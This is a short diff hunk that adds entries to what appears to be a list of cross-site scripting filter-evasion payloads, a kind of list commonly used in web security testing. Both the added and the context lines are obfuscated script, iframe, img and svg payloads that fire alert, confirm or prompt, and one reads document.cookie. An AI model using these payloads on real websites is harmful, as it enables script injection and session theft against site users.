@@ -8,7 +8,11 @@
 
 <s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
 <--<img/src=%20onerror=confirm``>%20--!>
+<select><noembed></select><script x='a@b'a>
+y='a@b'//a@b%0a\u0061lert(1)</script x>
 
+xss'''><iframe srcdoc='%26it;script>;prompt`
+${document.domain}`%26it;/script>'>
 <iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
 
 <sVg/onLy=1 onLoaD=confirm(1)//
